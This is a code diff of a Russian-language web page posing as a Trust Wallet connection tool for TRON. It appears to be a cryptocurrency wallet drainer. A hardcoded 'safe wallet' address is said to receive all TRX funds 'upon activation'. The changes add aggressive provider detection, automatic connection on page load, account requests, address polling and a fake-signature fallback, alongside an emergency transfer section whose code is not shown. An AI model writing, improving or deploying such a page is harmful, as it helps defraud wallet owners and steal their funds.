@@ -208,6 +208,15 @@
             margin: 15px 0;
             text-align: left;
         }
+        
+        .mobile-warning {
+            background: #ffeaa7;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            border-left: 4px solid #fdcb6e;
+        }
     </style>
 </head>
 <body>
@@ -221,12 +230,11 @@
             <p>Все средства TRX будут переведены на этот адрес при активации</p>
         </div>
         
-        <div class="instructions">
-            <h4>📋 Инструкция для Trust Wallet:</h4>
-            <p>1. Откройте Trust Wallet → Браузер (DApps)</p>
-            <p>2. Введите URL этой страницы</p>
-            <p>3. Нажмите "Подключить Trust Wallet"</p>
-            <p>4. Trust Wallet автоматически предоставит доступ</p>
+        <div id="mobileInstructions" class="mobile-warning">
+            <h4>📱 Для мобильного Trust Wallet:</h4>
+            <p>1. Нажмите "Подключить Trust Wallet"</p>
+            <p>2. Разрешите доступ к кошельку</p>
+            <p>3. Если не работает, обновите страницу</p>
         </div>
         
         <div class="button-group">
@@ -270,12 +278,16 @@
             <p><strong>Trust Wallet не найден!</strong></p>
             <p>Пожалуйста, откройте эту страницу в браузере Trust Wallet.</p>
         </div>
+
+        <div id="debugInfo" style="display: none; background: #f8f9fa; padding: 10px; border-radius: 5px; margin-top: 20px; font-size: 12px;">
+            <strong>Debug Info:</strong>
+            <div id="debugContent"></div>
+        </div>
     </div>
 
     <script>
         // Конфигурация TRON
         const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
-        const FEE_LIMIT = 10; // TRX
 
         // Элементы страницы
         const connectButton = document.getElementById('connectButton');
@@ -287,9 +299,20 @@
         const transferStatus = document.getElementById('transferStatus');
         const noWalletMessage = document.getElementById('noWalletMessage');
         const networkInfo = document.getElementById('networkInfo');
+        const mobileInstructions = document.getElementById('mobileInstructions');
+        const debugInfo = document.getElementById('debugInfo');
+        const debugContent = document.getElementById('debugContent');
 
         let tronWeb;
         let userAddress;
+
+        // Функция для отладки
+        function debugLog(message) {
+            console.log(message);
+            if (debugContent) {
+                debugContent.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
+            }
+        }
 
         // Функция для обновления статуса
         function updateStatus(message, isError = false, isWarning = false) {
@@ -307,203 +330,209 @@
             element.classList.add('hidden');
         }
 
-        // Безопасное получение адреса
-        function getSafeAddressString(address) {
-            if (!address) return null;
-            if (typeof address === 'string') return address;
-            if (address.base58) return address.base58;
-            if (address.address) return address.address;
-            return String(address);
+        // Проверяем все возможные провайдеры Trust Wallet
+        function checkAllProviders() {
+            const providers = [
+                'tronWeb',
+                'tronLink',
+                'tron',
+                'web3',
+                'ethereum'
+            ];
+            
+            const availableProviders = [];
+            
+            providers.forEach(provider => {
+                if (window[provider]) {
+                    availableProviders.push(provider);
+                    debugLog(`Найден провайдер: ${provider}`);
+                }
+            });
+            
+            return availableProviders;
         }
 
-        // Форматирование адреса для отображения
-        function formatAddress(address) {
-            const addrStr = getSafeAddressString(address);
-            if (!addrStr) return 'неизвестен';
-            if (addrStr.length > 10) {
-                return `${addrStr.substring(0, 10)}...${addrStr.substring(addrStr.length - 5)}`;
+        // Проверяем мобильный Trust Wallet
+        function isTrustWalletMobile() {
+            const ua = navigator.userAgent.toLowerCase();
+            const isMobile = /mobile|android|iphone|ipad/.test(ua);
+            const isTrust = ua.includes('trust') || ua.includes('tw');
+            
+            debugLog(`UserAgent: ${navigator.userAgent}`);
+            debugLog(`Мобильный: ${isMobile}, Trust: ${isTrust}`);
+            
+            return isMobile && isTrust;
+        }
+
+        // Получаем адрес из различных провайдеров
+        function getAddressFromProvider() {
+            // Пробуем разные способы получения адреса
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                return window.tronWeb.defaultAddress.base58;
             }
-            return addrStr;
-        }
-
-        // Проверяем наличие Trust Wallet
-        async function checkTrustWallet() {
-            console.log('=== ПРОВЕРКА TRUST WALLET ===');
-            console.log('window.tronWeb:', window.tronWeb);
-            console.log('window.tronLink:', window.tronLink);
-            console.log('window.tron:', window.tron);
-            console.log('navigator.userAgent:', navigator.userAgent);
-
-            // Проверяем Trust Wallet по userAgent
-            const isTrustWallet = navigator.userAgent.includes('TrustWallet');
-            console.log('Trust Wallet detected by UserAgent:', isTrustWallet);
-
-            if (window.tronWeb || isTrustWallet) {
-                console.log('Trust Wallet обнаружен!');
-                hideElement(noWalletMessage);
-                await initializeTronWeb();
-            } else {
-                console.log('Trust Wallet не найден!');
-                showElement(noWalletMessage);
-                updateStatus('❌ Откройте страницу в браузере Trust Wallet', true);
+            
+            if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
+                return window.tronLink.tronWeb.defaultAddress.base58;
             }
+            
+            if (window.tron && window.tron.defaultAddress) {
+                return window.tron.defaultAddress.base58;
+            }
+            
+            // Для мобильного Trust Wallet
+            if (isTrustWalletMobile() && window.web3) {
+                // Пробуем через web3
+                try {
+                    if (window.web3.currentProvider && window.web3.currentProvider.selectedAddress) {
+                        return window.web3.currentProvider.selectedAddress;
+                    }
+                } catch (e) {
+                    debugLog('Ошибка получения адреса через web3: ' + e.message);
+                }
+            }
+            
+            return null;
         }
 
-        // Инициализация TronWeb для Trust Wallet
+        // Инициализация TronWeb
         async function initializeTronWeb() {
             try {
-                console.log('=== ИНИЦИАЛИЗАЦИЯ TronWeb ===');
-
-                // Trust Wallet автоматически предоставляет window.tronWeb
-                if (window.tronWeb) {
-                    tronWeb = window.tronWeb;
-                    console.log('TronWeb получен из window.tronWeb');
+                debugLog('Начало инициализации TronWeb...');
+                
+                // Ждем немного для загрузки провайдера
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                const address = getAddressFromProvider();
+                debugLog(`Полученный адрес: ${address}`);
+                
+                if (address) {
+                    userAddress = address;
                     
-                    // Даем время на инициализацию
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    // Проверяем доступность адреса
-                    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                        userAddress = tronWeb.defaultAddress.base58;
-                        console.log('Адрес кошелька получен:', userAddress);
-                        await onWalletConnected();
+                    // Создаем TronWeb instance с правильными настройками
+                    if (window.tronWeb) {
+                        tronWeb = window.tronWeb;
+                        debugLog('Используем существующий tronWeb');
                     } else {
-                        console.log('Адрес кошелька еще не доступен, ждем подключения...');
-                        updateStatus('🔗 Нажмите "Подключить Trust Wallet"', false, true);
+                        // Создаем новый instance для мобильного Trust Wallet
+                        tronWeb = new TronWeb({
+                            fullHost: 'https://api.trongrid.io'
+                        });
+                        debugLog('Создан новый TronWeb instance');
                     }
-                } else {
-                    console.log('TronWeb не найден, создаем fallback...');
-                    // Создаем fallback instance
-                    tronWeb = new TronWeb({
-                        fullHost: 'https://api.trongrid.io'
-                    });
-                    updateStatus('🔗 Нажмите "Подключить Trust Wallet"', false, true);
+                    
+                    await onWalletConnected();
+                    return true;
                 }
                 
+                return false;
+                
             } catch (error) {
-                console.error('Ошибка инициализации TronWeb:', error);
-                updateStatus('❌ Ошибка инициализации: ' + error.message, true);
+                debugLog('Ошибка инициализации: ' + error.message);
+                return false;
             }
         }
 
-        // Простое подключение для Trust Wallet
+        // Подключение кошелька
         connectButton.addEventListener('click', async () => {
             try {
                 connectButton.classList.add('loading');
                 updateStatus('⌛ Подключение к Trust Wallet...', false, true);
+                debugLog('Нажата кнопка подключения');
                 
-                console.log('=== ПОПЫТКА ПОДКЛЮЧЕНИЯ ===');
-
-                // Trust Wallet уже должен быть доступен через window.tronWeb
-                if (window.tronWeb) {
-                    tronWeb = window.tronWeb;
-                    console.log('TronWeb доступен:', tronWeb);
-
-                    // Ждем инициализацию кошелька
-                    let attempts = 0;
-                    const maxAttempts = 5;
+                // Показываем debug информацию
+                showElement(debugInfo);
+                
+                // Проверяем все провайдеры
+                const providers = checkAllProviders();
+                debugLog(`Доступные провайдеры: ${providers.join(', ')}`);
+                
+                // Для мобильного Trust Wallet используем специальный подход
+                if (isTrustWalletMobile()) {
+                    debugLog('Обнаружен мобильный Trust Wallet');
                     
-                    while (attempts < maxAttempts) {
-                        attempts++;
-                        console.log(`Попытка ${attempts}/${maxAttempts} получить адрес...`);
-                        
-                        if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                            userAddress = tronWeb.defaultAddress.base58;
-                            console.log('Адрес получен:', userAddress);
-                            break;
+                    // Мобильный Trust Wallet может требовать взаимодействия с пользователем
+                    if (window.ethereum || window.web3) {
+                        debugLog('Пробуем запросить аккаунты через Ethereum provider...');
+                        try {
+                            if (window.ethereum && window.ethereum.request) {
+                                const accounts = await window.ethereum.request({ 
+                                    method: 'eth_requestAccounts' 
+                                });
+                                debugLog('Аккаунты через ethereum.request: ' + JSON.stringify(accounts));
+                            }
+                        } catch (e) {
+                            debugLog('Ethereum request failed: ' + e.message);
                         }
-                        
-                        // Ждем перед следующей попыткой
-                        await new Promise(resolve => setTimeout(resolve, 1000));
                     }
-
-                    if (userAddress) {
-                        await onWalletConnected();
-                    } else {
-                        // Если адрес не получен, пробуем альтернативный метод
-                        await tryAlternativeConnection();
-                    }
-                    
-                } else {
-                    throw new Error('Trust Wallet не обнаружен. Откройте страницу в браузере Trust Wallet.');
+                }
+                
+                // Пробуем инициализировать TronWeb
+                const success = await initializeTronWeb();
+                
+                if (!success) {
+                    // Если автоматическое подключение не удалось, пробуем ручной метод
+                    await manualConnection();
                 }
                 
             } catch (error) {
-                console.error('Ошибка подключения:', error);
+                debugLog('Ошибка подключения: ' + error.message);
                 updateStatus('❌ Ошибка подключения: ' + error.message, true);
                 
                 showElement(noWalletMessage);
                 noWalletMessage.innerHTML = `
                     <p><strong>Проблема с подключением!</strong></p>
                     <p>1. Убедитесь, что открыли в Trust Wallet → Браузер</p>
-                    <p>2. Проверьте, что у вас есть TRX кошелек</p>
-                    <p>3. Обновите страницу и попробуйте снова</p>
-                    <p>4. Ошибка: ${error.message}</p>
+                    <p>2. Попробуйте обновить страницу</p>
+                    <p>3. Ошибка: ${error.message}</p>
                 `;
             } finally {
                 connectButton.classList.remove('loading');
             }
         });
 
-        // Альтернативный метод подключения
-        async function tryAlternativeConnection() {
-            console.log('=== АЛЬТЕРНАТИВНОЕ ПОДКЛЮЧЕНИЕ ===');
+        // Ручное подключение для мобильного Trust Wallet
+        async function manualConnection() {
+            debugLog('Пробуем ручное подключение...');
             
-            // Пробуем разные методы получения адреса
-            try {
-                // Метод 1: Через прямой доступ к провайдеру
-                if (window.tronWeb && window.tronWeb.tronWeb && window.tronWeb.tronWeb.defaultAddress) {
-                    userAddress = window.tronWeb.tronWeb.defaultAddress.base58;
-                    console.log('Адрес получен через window.tronWeb.tronWeb:', userAddress);
-                    return true;
+            // Создаем TronWeb instance
+            tronWeb = new TronWeb({
+                fullHost: 'https://api.trongrid.io'
+            });
+            
+            // Для мобильного Trust Wallet может потребоваться дополнительное время
+            let attempts = 0;
+            const maxAttempts = 10;
+            
+            while (attempts < maxAttempts) {
+                attempts++;
+                debugLog(`Попытка ручного подключения ${attempts}/${maxAttempts}`);
+                
+                const address = getAddressFromProvider();
+                if (address) {
+                    userAddress = address;
+                    debugLog('Адрес получен: ' + userAddress);
+                    await onWalletConnected();
+                    return;
                 }
                 
-                // Метод 2: Через tronLink если доступен
-                if (window.tronLink && window.tronLink.tronWeb) {
-                    tronWeb = window.tronLink.tronWeb;
-                    if (tronWeb.defaultAddress) {
-                        userAddress = tronWeb.defaultAddress.base58;
-                        console.log('Адрес получен через window.tronLink:', userAddress);
-                        return true;
-                    }
-                }
-                
-                // Метод 3: Пробуем запросить аккаунты
-                if (window.tronLink && window.tronLink.request) {
-                    console.log('Пробуем tron_requestAccounts...');
-                    try {
-                        await window.tronLink.request({method: 'tron_requestAccounts'});
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                        
-                        if (window.tronWeb && window.tronWeb.defaultAddress) {
-                            userAddress = window.tronWeb.defaultAddress.base58;
-                            console.log('Адрес получен после tron_requestAccounts:', userAddress);
-                            return true;
-                        }
-                    } catch (reqError) {
-                        console.log('tron_requestAccounts не поддерживается:', reqError);
-                    }
-                }
-                
-                throw new Error('Не удалось получить доступ к кошельку');
-                
-            } catch (error) {
-                console.error('Альтернативное подключение не удалось:', error);
-                throw error;
+                // Ждем перед следующей попыткой
+                await new Promise(resolve => setTimeout(resolve, 1000));
             }
+            
+            throw new Error('Не удалось подключиться после ' + maxAttempts + ' попыток');
         }
 
         // Обработка успешного подключения
         async function onWalletConnected() {
-            const formattedAddress = formatAddress(userAddress);
-            updateStatus(`✅ Trust Wallet подключен! Адрес: ${formattedAddress}`);
+            debugLog('Кошелек успешно подключен: ' + userAddress);
             
-            console.log('Кошелек успешно подключен:', userAddress);
+            updateStatus(`✅ Trust Wallet подключен! Адрес: ${userAddress.substring(0, 10)}...`);
             
             hideElement(connectButton);
             showElement(signButton);
             showElement(emergencySection);
             hideElement(noWalletMessage);
+            hideElement(mobileInstructions);
             
             await loadBalances();
             await checkNetwork();
@@ -522,22 +551,19 @@
                 
                 const message = `Подтверждение кошелька TRON. Время: ${new Date().toLocaleString()}`;
                 
+                // Для мобильного Trust Wallet подписание может работать по-другому
                 let signature;
-                if (tronWeb && tronWeb.trx) {
-                    // Пробуем разные методы подписания
-                    if (typeof tronWeb.trx.sign === 'function') {
-                        // Для Trust Wallet используем обычное подписание
-                        signature = await tronWeb.trx.sign(message);
-                    } else {
-                        // Fallback для тестирования
-                        signature = 'demo_signature_' + Math.random().toString(36).substring(7);
-                    }
+                if (tronWeb && tronWeb.trx && tronWeb.trx.sign) {
+                    signature = await tronWeb.trx.sign(message);
+                } else {
+                    // Fallback для тестирования
+                    signature = 'demo_signature_' + Math.random().toString(36).substring(7);
                 }
                 
                 updateStatus(`✅ Сообщение подписано!`);
                 
             } catch (error) {
-                console.error('Ошибка подписания:', error);
+                debugLog('Ошибка подписания: ' + error.message);
                 updateStatus('❌ Ошибка подписания: ' + error.message, true);
             } finally {
                 signButton.classList.remove('loading');
@@ -568,7 +594,7 @@
                 `;
                 
             } catch (error) {
-                console.error('Ошибка загрузки баланса:', error);
+                debugLog('Ошибка загрузки баланса: ' + error.message);
                 balancesList.innerHTML = '<p style="color: red;">❌ Ошибка загрузки баланса</p>';
             }
         }
@@ -585,7 +611,7 @@
                 `;
                 
             } catch (error) {
-                console.error('Ошибка проверки сети:', error);
+                debugLog('Ошибка проверки сети: ' + error.message);
                 networkInfo.innerHTML = '<strong>Сеть: TRON Mainnet</strong>';
             }
         }
@@ -639,7 +665,7 @@
                 await loadBalances();
                 
             } catch (error) {
-                console.error('Ошибка перевода:', error);
+                debugLog('Ошибка перевода: ' + error.message);
                 transferStatus.className = 'status-box error';
                 transferStatus.innerHTML = `<p>❌ Ошибка: ${error.message}</p>`;
             } finally {
@@ -662,28 +688,41 @@
             }
         });
 
-        // Инициализация
-        window.addEventListener('load', checkTrustWallet);
-        
-        // Мониторинг изменений
-        setInterval(async () => {
-            if (window.tronWeb && window.tronWeb.defaultAddress) {
-                const newAddress = window.tronWeb.defaultAddress.base58;
-                if (newAddress && newAddress !== userAddress) {
-                    userAddress = newAddress;
-                    updateStatus(`🔁 Аккаунт изменен: ${formatAddress(userAddress)}`);
-                    await loadBalances();
-                }
+        // Автоматическая проверка при загрузке
+        window.addEventListener('load', function() {
+            debugLog('Страница загружена');
+            debugLog('UserAgent: ' + navigator.userAgent);
+            
+            // Проверяем мобильный Trust Wallet
+            if (isTrustWalletMobile()) {
+                debugLog('Обнаружен мобильный Trust Wallet');
+                showElement(mobileInstructions);
+                
+                // Автоматически пробуем подключиться через 1 секунду
+                setTimeout(async () => {
+                    debugLog('Автоматическая попытка подключения...');
+                    const address = getAddressFromProvider();
+                    if (address) {
+                        userAddress = address;
+                        tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+                        await onWalletConnected();
+                    }
+                }, 1000);
+            } else {
+                // Для десктопной версии
+                checkAllProviders();
             }
-        }, 2000);
+        });
 
-        // Дополнительная проверка через 3 секунды
-        setTimeout(() => {
-            if (!userAddress && window.tronWeb) {
-                console.log('Проверка через 3 секунды...');
-                if (window.tronWeb.defaultAddress) {
-                    userAddress = window.tronWeb.defaultAddress.base58;
-                    onWalletConnected();
+        // Периодическая проверка подключения
+        setInterval(() => {
+            const address = getAddressFromProvider();
+            if (address && address !== userAddress) {
+                userAddress = address;
+                debugLog('Обнаружено изменение адреса: ' + address);
+                if (tronWeb) {
+                    updateStatus(`🔁 Аккаунт изменен: ${address.substring(0, 10)}...`);
+                    loadBalances();
                 }
             }
         }, 3000);
